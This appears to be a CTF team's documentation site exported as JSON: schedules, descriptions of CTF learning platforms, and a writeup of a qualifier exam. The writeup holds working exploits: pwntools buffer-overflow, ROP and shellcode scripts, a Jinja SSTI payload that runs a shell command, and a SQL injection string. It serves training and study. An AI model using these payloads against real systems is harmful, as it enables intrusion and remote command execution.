Meeting Room, Southern ToE Insomni'hack teaser 2024 Preparing for the Insomni'hack event with a teaser CTF that offers a sneak peek into the types of challenges to be expected. Contests - Insomni'hack 2024-01-27 09:00 551 Meeting Room, Southern ToE Monthly Competition: The Winter is Coming CTF Internal monthly competition designed to keep the team's skills sharp and foster a competitive spirit within the team. TBA 2024-01-28 14:00 551 Meeting Room, Southern ToE Real World CTF 6th Participation in the 6th edition of Real World CTF, facing off against real-world security challenges and scenarios. https://realworldctf.com/"},{"location":"Training/Schedule/2023Winter/#summary","title":"Summary","text":"<p>As we reach the culmination of our preparatory stage for the meticulous regimen our Capture The Flag (CTF) collective intends to undertake, the structured schema we have embraced clearly bespeaks our aim to incur a comprehensive repertoire of capabilities within our confraternity, spanning the spectrum from rudimental precepts to sophisticated stratagems in the realm of cybersecurity. The schedule we\u2019ve meticulously curated evolves seamlessly from didactic symposiums to hands-on, combative scenarios, guaranteeing that our assemblage is not merely conversant with avant-garde methodologies but proficient in their deployment amidst the exigencies of tangible situations.</p> <p>The instructional compendium entitled \"The Missing Course\" series acts as the cornerstone of our pedagogy, imparting a robust grounding in indispensable subject matter incorporating the arts of data manipulation, command line utilization, versioning of software revisions, debugging, system performance evaluation, and the arcane craft of metaprogramming. These sessions are tailored to forge connections between theoretical acumen and the pragmatic competencies demanded in the cybersecurity vocation.</p> <p>Our participation in illustrious tournaments such as the ASIS CTF Finals, IrisCTF, bi0sCTF, Insomni'hack, and Real World CTF will furnish our cadre with the prospect to gauge our prowess against some of the preeminent figures in this discipline. These rendezvous will afford us not simply the venue to employ our acquired enlightenment but also to assimilate wisdom from our contemporaries and perpetually refine our artifices.</p> <p>The institution of a monthly internal challenge, dubbed \"The Winter is Coming CTF,\" will maintain our ensemble's continued engagement and vigilance, thus preserving that the acquired skills are rigorously exercised and polished.</p> <p>Further, we have paved the way for the promulgation of knowledge and collaborative endeavor through the genesis of a GitHub consortium, devised for the synchronization of resources, which will act as a vault for our shared intellect and as an amphitheater for incessant edification.</p> <p>In essence, our envisioned timeline transcends a mere itinerary of forthcoming occurrences; it embodies a tactical blueprint, expressly contrived to inculcate a paradigm of superlative performance and an unyielding quest for proficiency in cybersecurity within our fraternity. As we advance upon this voyage, we persist malleable, amenable to embracing novel challenges and educational prospects that may present themselves. Our paramount ambition is to not only secure victory in competitive jousts but to sculpt a squadron supremely equipped to confront the cybersecurity menaces of the morrow. </p> <p>Let us proceed with tenacity and a collective ethos dedicated to pinnacle achievement, symbiotic coaction, and incessant melioration. Here\u2019s to an annum replete with augmentation, intellectual acquisition, and laurels in the theatre of CTF contests!</p>"},{"location":"Website/Forum/kanxue/","title":"\u770b\u96ea\u5b66\u9662","text":"<p>Kanxue Security Documentation is a forum to post all things about cybersecurity from operating systems to web security, from binary exploitation to wiki and IoT security.</p> <p>The knowledge base contains good posts in forum.</p> <p></p>"},{"location":"Website/Forum/kanxue/#reference","title":"Reference","text":"<p>Link: https://www.kanxue.com/chm.htm</p>"},{"location":"Website/Platform/CTFHub/","title":"CTFHub","text":"<p>Easy to use CTF learn tutorial.</p> <p>Contains CTF events time schedule, skills that CTFers should learn, challenges provided, and tools and other assistant.</p> <p></p>"},{"location":"Website/Platform/CTFHub/#advantages-and-disadvantages","title":"Advantages and disadvantages","text":"<p>CTF hub is a new CTF platform provided to help CTF gamers to train skills and get information of events. It's full of everything that is useful from tutorial to challenges.</p> <p>The skill tree is under construction and new contents are continuously added to the current components.</p> <p>CTF hub provides a calendar to check upcoming CTF competitions, subscribe the calendar to find new events.</p> <p>https://api.ctfhub.com/User_API/Event/getAllICS</p>"},{"location":"Website/Platform/CTFHub/#reference","title":"Reference","text":"<p>CTF hub link: https://www.ctfhub.com/</p>"},{"location":"Website/Platform/CTFlearn/","title":"CTFlearn","text":"<p>CTF learn is a challenge website for user update challenges and solve challenges.</p> <p>Those challenges are uploaded by community and users who solves the challenge can leave comments and score for the challenge.</p> <p></p> <p>To submit flag and acquire scores, you need an account. In CTF learn, the accounts are free to register. Once you finish the registration, you may login with the account.</p> <p>For business user and education propose, CTF learn offers a professional edition called Learn++.</p> <p>Some online labs are also useful for beginners.</p> <p></p>"},{"location":"Website/Platform/CTFlearn/#reference","title":"Reference","text":"<p>CTF learn link: https://ctflearn.com/</p>"},{"location":"Website/Platform/Cryptopals/","title":"Cryptopals Crypto Challenges","text":""},{"location":"Website/Platform/Cryptopals/#welcome-to-the-challenges","title":"Welcome to the challenges","text":""},{"location":"Website/Platform/Cryptopals/#work-in-progress","title":"Work in progress.","text":"<p>This site will host all eight sets of our crypto challenges, with solutions in most mainstream languages.</p> <p>But: it doesn't yet. If we waited to hit \"publish\" until everything was here, we might be writing this in 2015. So we're publishing as we go. In particular: give us a little time on the challenge solutions.</p> <p>We can't introduce these any better than Maciej Ceglowski did, so read that blog post first.</p> <p>We've built a collection of 48 exercises that demonstrate attacks on real-world crypto.</p> <p>This is a different way to learn about crypto than taking a class or reading a book. We give you problems to solve. They're derived from weaknesses in real-world systems and modern cryptographic constructions. We give you enough info to learn about the underlying crypto concepts yourself. When you're finished, you'll not only have learned a good deal about how cryptosystems are built, but you'll also understand how they're attacked.</p>"},{"location":"Website/Platform/Cryptopals/#what-are-the-rules","title":"What Are The Rules?","text":"<p>There aren't any! For several years, we ran these challenges over email, and asked participants not to share their results. The honor system worked beautifully! But now we're ready to set aside the ceremony and just publish the challenges for everyone to work on.</p>"},{"location":"Website/Platform/Cryptopals/#how-much-math-do-i-need-to-know","title":"How Much Math Do I Need To Know?","text":"<p>If you have any trouble with the math in these problems, you should be able to find a local 9th grader to help you out. It turns out that many modern crypto attacks don't involve much hard math.</p>"},{"location":"Website/Platform/Cryptopals/#how-much-crypto-do-i-need-to-know","title":"How Much Crypto Do I Need To Know?","text":"<p>None. That's the point.</p>"},{"location":"Website/Platform/Cryptopals/#so-what-do-i-need-to-know","title":"So What Do I Need To Know?","text":"<p>You'll want to be able to code proficiently in any language. We've received submissions in C, C++, Python, Ruby, Perl, Visual Basic, X86 Assembly, Haskell, and Lisp. Surprise us with another language. Our friend Maciej says these challenges are a good way to learn a new language, so maybe now's the time to pick up Clojure or Rust.</p>"},{"location":"Website/Platform/Cryptopals/#what-should-i-expect","title":"What Should I Expect?","text":"<p>Right now, we have eight sets. They get progressively harder. Again: these are based off real-world vulnerabilities. None of them are \"puzzles\". They're not designed to trip you up. Some of the attacks are clever, though, and if you're not familiar with crypto cleverness... well, you should like solving puzzles. An appreciation for early-90's MTV hip-hop can't hurt either.</p>"},{"location":"Website/Platform/Cryptopals/#can-you-give-us-a-long-winded-indulgent-description-for-why-youve-chosen-to-do-this","title":"Can You Give Us A Long-Winded Indulgent Description For Why You'Ve Chosen To Do This?","text":"<p>It turns out that we can.</p> <p>If you're not that familiar with crypto already, or if your familiarity comes mostly from things like Applied Cryptography, this fact may surprise you: most crypto is fatally broken. The systems we're relying on today that aren't known to be fatally broken are in a state of just waiting to be fatally broken. Nobody is sure that TLS 1.2 or SSH 2 or OTR are going to remain safe as designed.</p> <p>The current state of crypto software security is similar to the state of software security in the 1990s. Specifically: until around 1995, it was not common knowledge that software built by humans might have trouble counting. As a result, nobody could size a buffer properly, and humanity incurred billions of dollars in cleanup after a decade and a half of emergency fixes for memory corruption vulnerabilities.</p> <p>Counting is not a hard problem. But cryptography is. There are just a few things you can screw up to get the size of a buffer wrong. There are tens, probably hundreds, of obscure little things you can do to take a cryptosystem that should be secure even against an adversary with more CPU cores than there are atoms in the solar system, and make it solveable with a Perl script and 15 seconds. Don't take our word for it: do the challenges and you'll see.</p> <p>People \"know\" this already, but they don't really know it in their gut, and we think the reason for that is that very few people actually know how to implement the best-known attacks. So, mail us, and we'll give you a tour of them.</p>"},{"location":"Website/Platform/Cryptopals/#how-do-i-start","title":"How do I start?","text":"<p>Start here!</p>"},{"location":"Website/Platform/Cryptopals/#who-did-this","title":"Who did this?","text":"<ul> <li>Thomas Ptacek (@tqbf)</li> <li>Sean Devlin (@spdevlin)</li> <li>Alex Balducci (@iamalexalright)</li> <li>Marcin Wielgoszewski (@marcinw)</li> </ul> <p>Cryptopals is maintained and expanded (from Set 8 on) by Sean Devlin, in conjunction with the Cryptography Services Team at NCC Group.</p> <p>We could not possibly have done this without the help of several other people. Roughly in order of influence:</p> <ul> <li>Nate Lawson taught us virtually everything we know about cryptography.</li> <li>Trevor Perrin taught Nate some of that. I can tell you a pretty compelling story about how Trevor is the intellectual origin of every successful attack on TLS over the past 5 years.</li> <li>Thai Duong and Juliano Rizzo are the godfathers of practical cryptographic software security. Several things in this challenge didn't make sense to us until after Thai and Juliano exploited them in mainstream software.</li> </ul>"},{"location":"Website/Platform/Cryptopals/#legal","title":"Legal","text":"<p>Individual exercise submissions are owned by their author, and may or may not be distributed under an open source license.</p>"},{"location":"Website/Platform/Cryptopals/#links","title":"Links","text":"<p>https://cryptopals.com/</p>"},{"location":"Website/Platform/TryHackMe/","title":"TryHackMe","text":"<p>Here's another platform for learning and hacking.</p> <p>The difference between tryhackme and ordinary CTF challenge website is that thm uses <code>rooms</code> for challenge. Each room contains of several questions and you need to finish them all to solve a room.</p> <p>The room is also called a target environment in cyber security. In case that vulnerabilities are available in rooms, each room should be created for each user. That's say, you need to create a room and deploy machine before hacking.</p> <p></p> <p>All target environments are on the thm's cloud server and you don't need to configure local machine to deploy target environment. However, you need to connect to the thm's local network so that you can hack the target environment.</p> <p>Two ways for user to connect. The first and <code>free</code> way is to use OpenVPN and configure your VPN with thm's ovpn file. The second is to use hack box, for community user, free box can only be used 1 hour one day. Otherwise, you need to purchase <code>premium</code> edition of thm.</p> <p>Rooms are also can be uploaded by users. This makes it possible for us to create our own target environment.</p> <p>Besides, thm provides several learning courses for beginners.</p> <p></p> <p>For advanced users, there some other useful pages provided by thm.</p> <p>You can find some useful blog related to the cybersecurity and some other websites such like tutorials, terms, swag shop.</p> <p>TryHackMe is a great platform for both beginners and advanced hackers.</p> <p></p>"},{"location":"Website/Platform/TryHackMe/#reference","title":"Reference","text":"<p>TryHackMe link: https://tryhackme.com/docs</p>"},{"location":"Website/Platform/World%20of%20Attack%26Defense/","title":"World of Attack&amp;Defense","text":"<p>World of Attack&amp;Defense (Aka \u653b\u9632\u4e16\u754c) is another fully constructed CTF platform of challenges and event schedule.</p> <p></p> <p>The challenge environment of WAD constructed from deployed machines that you need to deploy environment before solving the challenge.</p> <p>That is, in some time, the deployment environment of WAD is failed and users can not finish challenges.</p> <p>However, the challenge quality is pretty good and writeups submitted by users are also good to read.</p>"},{"location":"Website/Platform/World%20of%20Attack%26Defense/#reference","title":"Reference","text":"<p>World of Attack &amp; Defense link: https://adworld.xctf.org.cn/</p>"},{"location":"Website/Platform/ctftime/","title":"ctftime","text":"<p>CTF time is a platform to provide schedule for upcoming and past CTF events. Famous CTF events usually synchronize their schedule to the CTF time, and CTFers all along the world would participate the event.</p> <p></p> <p>Some famous CTF team also have their CTF time page to show their gains and record during the events. Along with the events schedule and team page, writeups are also collected by CTF time. Find writeups for the event by clicking corresponding event page and find <code>Event tasks and writeups</code> page.</p> <p></p> <p>Find upcoming CTF events using CTF time.</p>"},{"location":"Website/Platform/ctftime/#reference","title":"Reference","text":"<p>CTF time link: https://ctftime.org/</p>"},{"location":"Website/Platform/ichunqiu/","title":"ichunqiu","text":"<p>ichunqiu's platform is a good place to find upcoming events.</p> <p>This platform is based on the competitions and the solutions to the competitions. It doesn't provide any online challenge environment, but it provides almost all the Chinese CTF events schedule.</p> <p></p>"},{"location":"Website/Platform/ichunqiu/#reference","title":"Reference","text":"<p>Link: https://www.ichunqiu.com/competition</p>"},{"location":"Website/Platform/picoCTF/","title":"picoCTF","text":"<p>picoCTF is a series of CTFs focus on the high school students. Nowadays, picoCTF adds more difficult challenges that face to all gamers besides high school students.</p> <p>The picoCTF platform provides most of the challenges in picoCTF these years and you can try to solve those challenges online.</p> <p></p> <p>The challenges are from very easy to advanced. Some beginner challenges are friendly for CTF beginners and some advanced challenges may take you some time to solve.</p> <p>The binary challenges are hard for beginners and picoCTF doesn't provide beginner-friendly binary (pwn) challenges. For those who are starting their travel in binary field, maybe other platform is better than picoCTF.</p>"},{"location":"Website/Platform/picoCTF/#reference","title":"Reference","text":"<p>Link: https://play.picoctf.org/practice</p>"},{"location":"Website/Platform/pwnabletw/","title":"pwnable.tw","text":"<p>A series of binary exploitation (pwn) problems and you may try to solve them online.</p> <p>The quantity of challenges isn't much, but the quality is pretty good.</p> <p></p>"},{"location":"Website/Platform/pwnabletw/#reference","title":"Reference","text":"<p>Link: https://pwnable.tw/challenge/</p>"},{"location":"Website/Tutorial/CTF%20Field%20Guide/","title":"CTF Field Guide","text":"<p>In these chapters, you\u2019ll find everything you need to win your next CTF competition:</p> <ul> <li>Walkthroughs and details on past CTF challenges</li> <li>Guidance to help you design and create your own toolkits</li> <li>Case studies of attacker behavior, both in the real world and in past CTF competitions</li> </ul> <p>Consists of several introduction to each categories.</p> <p></p>"},{"location":"Website/Tutorial/CTF%20Field%20Guide/#reference","title":"Reference","text":"<p>Link: https://trailofbits.github.io/ctf/</p>"},{"location":"Website/Tutorial/CTF%20Wiki/","title":"CTF Wiki","text":"<p>As a freedom site, primarily focusing on recent CTFs, CTF Wiki introduces the knowledge and techniques in all aspects of CTF to make it easier for beginners to learn CTF.</p> <p>Now, CTF Wiki mainly contains the basic skills for CTF, but we are working hard to improve the following contents.</p> <ul> <li>Advanced skills used in CTF</li> <li>Special topics appearing in CTF</li> </ul> <p>For the above-mentioned parts to be improved, please refer to Projects which details what are planned.</p> <p>Although now CTF Wiki mainly focus CTF, it is not strictly limited to CTF topics. In the future, CTF Wiki will include</p> <ul> <li>Tools used in security research</li> <li>Increased discussion of security in the world</li> </ul> <p>In addition, given the following two points</p> <ul> <li>Information about technology should be openly shared.</li> <li>As new techniques are always being developed, old techniques will start to fade over time and they should be replaced with new techniques.</li> </ul> <p>Therefore, CTF Wiki will never publish books.</p> <p>Finally, originating from the community, as an independent organization, CTF Wiki advocates freedom of knowledge, will never be commercialized, and will always maintain the character of independence and freedom.</p> <p></p>"},{"location":"Website/Tutorial/CTF%20Wiki/#reference","title":"Reference","text":"<p>Link: https://ctf-wiki.org/</p>"},{"location":"Website/Tutorial/HackTricks/","title":"HackTricks","text":"<p>Welcome to the page where you will find each hacking trick/technique/whatever I have learnt in CTFs, real life apps, and reading researches and news.</p> <p>HackTricks contains learning methods of CTF and recently news about cybersecurity.</p> <p></p>"},{"location":"Website/Tutorial/HackTricks/#reference","title":"Reference","text":"<p>Link: https://book.hacktricks.xyz/</p>"},{"location":"Website/Tutorial/ctf101/","title":"Capture The Flag 101","text":"<p>Capture The Flags, or CTFs, are a kind of computer security competition.</p> <p>Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill.</p> <p>Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend.</p> <p>In this guide/wiki/handbook you'll learn the techniques, thought processes, and methodologies you need to succeed in Capture the Flag competitions.</p> <p>CTF 101 is the perfect website for CTF beginners.</p> <p></p>"},{"location":"Website/Tutorial/ctf101/#reference","title":"Reference","text":"<p>Link: https://ctf101.org/</p>"},{"location":"Website/Tutorial/how%20to%20become%20a%20hacker/","title":"How To Become A Hacker","text":"<p>An article of \"how to\" series written by Eric Steven Raymond.</p> <p>In this article, you can learn how to become a hacker, and what should you learn to contribute to the cybersecurity and hacking field.</p> <p>Remember the hacker attitudes:</p> <ol> <li>The world is full of fascinating problems waiting to be solved.</li> <li>No problem should ever have to be solved twice.</li> <li>Boredom and drudgery are evil.</li> <li>Freedom is good.</li> <li>Attitude is no substitute for competence.</li> </ol> <p></p>"},{"location":"Website/Tutorial/how%20to%20become%20a%20hacker/#reference","title":"Reference","text":"<p>Link: http://www.catb.org/~esr/faqs/hacker-howto.html</p>"},{"location":"Website/Tutorial/linux/","title":"Linux Tools Quick Tutorial","text":"<p>A website for linux beginners to learn with linux command and tools.</p> <p>This website is only a brief introduction to the linux. After learning the tutorial of linux, you can use linux just like using any other operating systems.</p> <p></p> <p>If you want to find more details of Linux instead of just learning of features and tutorials to usage, you may want to read \u300a\u9e1f\u54e5\u7684Linux\u79c1\u623f\u83dc\u300b. The reference to the blog is attached below this tutorial.</p>"},{"location":"Website/Tutorial/linux/#reference","title":"Reference","text":"<p>Link: https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/index.html</p> <p>\u9e1f\u54e5\u7684Linux\u79c1\u623f\u83dc: http://linux.vbird.org/</p>"},{"location":"Website/Tutorial/python/","title":"Python","text":"<p>Yet an introduction of Python3.</p> <p></p> <p>if you want to learn Python2, you can find Python2 version of this doc in Python document.</p>"},{"location":"Website/Tutorial/python/#reference","title":"Reference","text":"<p>Link: http://www.pythondoc.com/pythontutorial3/index.html</p>"},{"location":"Writeup/COMPASS%202022%20Summer/","title":"Writeup for 2022 Summer Qualifier Exam","text":"<p>The challenge number is 17 in total (with 1 hidden PWN challenge from the last year). All the challenges are simple and easy, modified from the previous competition challenges I've solved.</p> Category Quantity Link Crypto 3 Writeups Misc 2 Writeups PWN 4 Writeups Re 3 Writeups Web 4 Writeups"},{"location":"Writeup/COMPASS%202022%20Summer/#crypto","title":"Crypto","text":"<p>All the challenges are from DiceCTF 2022 @Hope. Currently, environment from the original website is down. We would hold those amazing challenges for further studies.</p>"},{"location":"Writeup/COMPASS%202022%20Summer/#_1","title":"\u8d85\u4e0b\u5934\u7684\u7b7e\u5230","text":"<pre><code>\u4eca\u65e5\u4efd\u6253\u5de5\u4eba\u8425\u4e1a\u5566\ud83d\udc9d \u6beb\u65e0\u62b5\u6297\u529b \u8fd8\u662f\u53bb\u6253CTF\u4e86 \u5565\u4e5f\u4e0d\u662f \u54d2\u54d2\u54d2 \u8fd9\u5bb6\u7684CTF\u8d85\u8d5e\u7684\u2753\u2753\u2753\u4ecb\u4e2a\u5c0f\u86cb\u7cd5\u4e5f\u771f\u4e0b\u5934\u2049\ufe0f\u2049\ufe0f\u2049\ufe0fsrds \u8def\u8fb9\u6361\u5230\u4e86\u4e00\u5206\u94b1 \u9884\u8b66\u26a0\ufe0f \u5566\u5566\u5566 \u661f\u661f\u6708\u4eae\u548c\u6211\u90fd\u8981\u7761\u5566\ud83c\udf38\n\n\u8c1c\u8bed\u4eba\u7684\u6697\u8bed: 575d55524a5c50586b46595d6e5a555b6e5f505f6b4c44555f6e575d446b55546b5f58556e43555b6e56506e5e5c506b43545a6a5c515f4c\n\u636e\u8bf4\u662f\u5bc6\u94a5: 114514\n</code></pre> <p>The description isn't related to the challenge. The key point is the last half of the description. A string of hex, and some strange digits.</p> <p>It's easy to think about the <code>xor</code> encryption. Very simple, use the <code>114514</code> (in escaped string) as a key, decode the given cipher:</p> <pre><code>flag{hai_shi_kan_kan_yuan_chu_de_jia_ran_ba_jia_ren_men}\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#rsa","title":"\u8d85\u8ff7\u4f60\u7684RSA","text":"<pre><code>c=32949\nn=64741\ne=42667\n</code></pre> <p>Very simple RSA with small N. Factor N into 101 and 641.</p> <pre><code>&gt;&gt;&gt; from Crypto.Util.number import *\n&gt;&gt;&gt; p = 101\n&gt;&gt;&gt; q = 641\n&gt;&gt;&gt; c = 32949\n&gt;&gt;&gt; e = 42667\n&gt;&gt;&gt; phi = (p-1)*(q-1)\n&gt;&gt;&gt; d = inverse(e,phi)\n&gt;&gt;&gt; pow(c,d,p*q)\n18429\n</code></pre> <p>Use the password to open the compress file, find the flag.</p> <pre><code>flag{gr34t_m1nds_th1nk_4l1ke}\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#aes","title":"\u8d85\u4fdd\u5bc6\u7684AES\u7b97\u6cd5","text":"<p>ECB mode AES encryption. The server gives out the hex ciphertext of flag once, then asks us to input a hex string, then prints the cipher text of the string.</p> <p>This is a CPA scenario. ECB mode can't defense from CPA. We use 0x00 string to reveal the key:</p> <pre><code>&gt; b0bcf580640b080efd0a25dd77b1e152b2e8b9d3285a531bff0b718c6fabe053e4b6a6832e505301ac4416ec449a8267\n&lt; 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n&gt; d6d094e71f686a369e3910ea429c8461c6c084f70f787a268e2900fa528c9471\n</code></pre> <p>We now know the key, use this key to decrypt flag:</p> <pre><code>flag{cb8c3575-e3d8-4729-a2af-7d22f2d18972}\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#misc","title":"Misc","text":"<p>All the challenges are modified from ctf.show \u4e03\u5915\u676f. </p>"},{"location":"Writeup/COMPASS%202022%20Summer/#_2","title":"\u7b7e\u5230","text":"<p>Gives a graph, the content doesn't matter. Use any hex editor or simply type <code>strings</code> command, and we can find the flag in the tail of the file.</p>"},{"location":"Writeup/COMPASS%202022%20Summer/#_3","title":"\u6559\u7687\u7684\u5bc6\u7801","text":"<p>The origin challenge is called <code>\u6d77\u76d7\u7684\u5bc6\u7801</code>. The ip region changed to Vatican in this challenge. Thus, we need to brute force all the IPs from Vatican.</p> <pre><code>185.17.220.0    185.17.223.255  1024\n185.152.68.0    185.152.71.255  1024\n193.43.102.0    193.43.103.255  512\n212.77.0.0  212.77.31.255   8192\n</code></pre> <p>The password is <code>212.77.31.255</code>. Open the compressed file to get the flag,</p>"},{"location":"Writeup/COMPASS%202022%20Summer/#pwn","title":"PWN","text":"<p>All the challenges are from XCTF's recent competitions.</p>"},{"location":"Writeup/COMPASS%202022%20Summer/#_4","title":"\u7b7e\u5230","text":"<p>Check the file properties first:</p> <pre><code>$ file 291721f42a044f50a2aead748d539df0\n291721f42a044f50a2aead748d539df0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped\n</code></pre> <p>The main logic is simple, main prints <code>hello, world</code>, then calls <code>vulnerable_function</code>.</p> <p>This function reads 0x200 bytes of data, and put them into 0x80 length buffer, which leads to a buffer overflow. Another useful function is <code>callsystem</code>, which gives us a shell.</p> <p>The steps to solve:</p> <ol> <li>Fill the first 0x80 bytes.</li> <li>Overflow the 0x8 bytes of stack data useless.</li> <li>Replace the next 4 bytes (return address) to <code>callsystem</code>.</li> </ol> <pre><code>from pwn import * \nr = process(\"./app\")\npayload = 'A' * 0x88 + p64(0x00400596)\nr.sendlineafter(\"Hello, World\\n\", payload)\nr.interactive()\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#_5","title":"\u5148\u522b\u6025","text":"<p>A little simple ROP challenge.</p> <p>In this challenge, we don't have <code>callsystem</code> function any more. Instead, we need to find a <code>/bin/sh</code> string in the program.</p> <p>Luckily, this challenge has <code>PIE disabled</code>. We can write libc address directly.</p> <ol> <li>Overflow and jump to <code>system</code> function address.</li> <li>Gives a <code>/bin/sh</code> string as parameter, and <code>0</code> as the second parameter.</li> </ol> <pre><code>from pwn import *\nsystem=0x08048320\nshell=0x0804A024\nr=process(\"./app\")\npayload='A'*(0x92)+p32(system)+p32(0)+p32(shell)\nr.sendlineafter(\"Input:\\n\", payload)\nr.interactive()\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#_6","title":"\u4f60\u731c\u6211\u731c\u4e0d\u731c","text":"<p>This challenge has Canary, NX, and PIE. We can't simple use ROP method because of the canary. However, the seed is on the stack as well. We can't reach the return address, but we can reach the seed integer.</p> <ol> <li>Overflow 0x20 bytes and reach seed.</li> <li>Replace the seed value.</li> </ol> <p>Use the same seed, we can \"predict\" all the random numbers.</p> <pre><code>from pwn import *\nfrom ctypes import *\n\nlibc=cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\")\nlibc.srand(0)\n\nr=process(\"./app\")\npayload='A'*(0x20)+p32(0)\nr.sendlineafter(\"Your name:\", payload)\n\nfor i in range(10):\n    num=str(libc.rand()%6+1)\n    r.sendlineafter(\"Please input your guess number:\", num)\nr.interactive()\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#_7","title":"\u8fc7\u5173\u65a9\u5c06","text":"<p>The first level: input \"east\" and win.</p> <p>The second level: use the format string in <code>printf(&amp;format, &amp;format)</code>, we can reveal the address.</p> <p>The last challenge gives us the control to input some codes, gives a shellcode.</p> <pre><code>from pwn import *\n\nshell=asm(shellcraft.amd64.linux.sh(),arch=\"amd64\")\nr=process(\"./app\")\npayload=\"%9x,%9x,%9x,%9x,%9x,%35x%n\"\nr.recvuntil(\"secret[0] is \")\naddr=str(int(r.recvuntil(\"\\n\")[:-1],16))\nr.sendlineafter(\"What should your character's name be:\",\"ailx10\")\nr.sendlineafter(\"So, where you will go?east or up?:\",\"east\")\nr.sendlineafter(\"go into there(1), or leave(0)?:\",\"1\")\nr.sendlineafter(\"'Give me an address'\",addr)\nr.sendlineafter(\"And, you wish is:\",payload)\nr.sendlineafter(\"Wizard: I will help you! USE YOU SPELL\",shell)\n\nr.interactive()\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#re","title":"Re","text":"<p>All the challenges are modified from various provinces' CTF competitions: \u897f\u666e\u676f\u4eac\u6d25\u5180\u4fe1\u606f\u5b89\u5168\u6311\u6218\u8d5b, \u7b2c\u4e94\u5c4a\u5c71\u4e1c\u7701\u7f51\u7edc\u5b89\u5168\u7ade\u8d5b, \u7f51\u9f0e\u676f\u6731\u96c0\u7ec4.</p>"},{"location":"Writeup/COMPASS%202022%20Summer/#_8","title":"\u771f\u7684\u662f\u7b7e\u5230","text":"<p>Check the ELF, IDA would gives several integers in <code>main</code> function. Be aware of the data types are meaningless in assembly, those <code>integers</code> are in fact <code>strings</code>.</p> <p>Mark the data as string, and we get the flag.</p> <pre><code>flag{4092849uio2jfklsj4k}\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#_9","title":"\u7edd\u5bf9\u5728\u7b2c\u4e94\u5c42","text":"<p>The program is written in MFC.</p> <p>Use dynamic analysis, on the address <code>0x401743</code> we can find a comparison. The compared string is the key to show the flag.</p> <pre><code>008225C8 s1 = \"123456\"\n00822668 s2 = \"xxxxxXXXXXxxxx\"\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#_10","title":"\u79cd\u6811","text":"<p>In the main logic, the flag's bits are calculated from the path in a binary tree. We need to find the flag bits from the path in binary tree to the target string <code>zvzjyvosgnzkbjjjypjbjdvmsjjyvsjx</code> (modified in this challenge).</p> <p>How to find the structure of the tree? We can use dynamic analysis, extract memory data from the execution.</p> <pre><code>[[\u2018y\u2019, \u20180000\u2019], [\u2018b\u2019, \u201800010\u2019], [\u2018q\u2019, \u201800011\u2019], [\u2018g\u2019, \u20180010\u2019], [\u2018f\u2019, \u20180011\u2019], [\u2018j\u2019, \u2018010\u2019], [\u2018w\u2019, \u201801100\u2019], [\u2018p\u2019, \u201801101\u2019], [\u2018x\u2019, \u2018011100\u2019], [\u2018d\u2019, \u20180111010\u2019], [\u2018i\u2019, \u20180111011\u2019], [\u2018k\u2019, \u201801111\u2019], [\u2018s\u2019, \u2018100\u2019], [\u2018z\u2019, \u20181010\u2019], [\u2018n\u2019, \u20181011\u2019], [\u2018c\u2019, \u201811000\u2019], [\u2018t\u2019, \u2018110010\u2019], [\u2018e\u2019, \u2018110011\u2019], [\u2018h\u2019, \u20181101\u2019], [\u2018o\u2019, \u201811100\u2019], [\u2018l\u2019, \u20181110100\u2019], [\u2018u\u2019, \u201811101010\u2019], [\u2018r\u2019, \u2018111010110\u2019], [\u2018a\u2019, \u2018111010111\u2019], [\u2018m\u2019, \u2018111011\u2019], [\u2018v\u2019, \u20181111\u2019]]\n</code></pre> <p>Find the path is simple, I won't describe here.</p>"},{"location":"Writeup/COMPASS%202022%20Summer/#web","title":"Web","text":"<p>Challenges are from DiceCTF 2022 @Hope, nice competition!</p>"},{"location":"Writeup/COMPASS%202022%20Summer/#_11","title":"\u7b80\u5355\u7684\u7b7e\u5230","text":"<p>Change the value of <code>admin</code> to <code>true</code> in cookie.</p>"},{"location":"Writeup/COMPASS%202022%20Summer/#_12","title":"\u7b80\u5355\u7684\u6a21\u677f","text":"<p>Simply use SSTI reversed version.</p> <pre><code>}})')(daer.)\"txt.galf/ppa/ tac\"(nepop.)\"so\"(__tropmi__'(]'lave'[]'__snitliub__'[__slabolg__.__tini__.]331[)(__sessalcbus__.]0[__sesab__.__ssalc__.''{{\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#_13","title":"\u7b80\u5355\u7684\u6ce8\u5165","text":"<p>In the palindrome submit, we can start SQL injection attack.</p> <p>The input should be a palindrome string.</p> <pre><code>'||(select flag from flags));--;))sgalfmorfgalftceles(||'\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#_14","title":"\u7b80\u5355\u7684\u5e8f\u5217","text":"<p>A simple GoLang unmarshal challenge. The GoLang's unmarshal doesn't care about the case of json, we can use upper case to bypass the filter.</p> <pre><code>{\n    \"whaT_point\":\"that_point\"\n}\n</code></pre>"},{"location":"Writeup/COMPASS%202022%20Summer/#remarks","title":"Remarks","text":"<p>Hope you enjoy this competition, and take this practice as a learning progress.</p>"},{"location":"Writeup/DiceCTF%202022/","title":"DiceCTF 2022 Author Writeups","text":"<p>by ireland / DiceGang</p>"},{"location":"Writeup/DiceCTF%202022/#crypto","title":"Crypto","text":"Challenge name Author Writeup crypto/baby-rsa ireland jump crypto/rejected ireland jump crypto/correlated ireland jump crypto/commitment-issues gripingberry jump crypto/pow-pow defund link crypto/learning without errors ireland jump crypto/shibari ireland jump crypto/psych defund link"},{"location":"Writeup/DiceCTF%202022/#misc","title":"Misc","text":"Challenge name Author Writeup misc/undefined aplet123 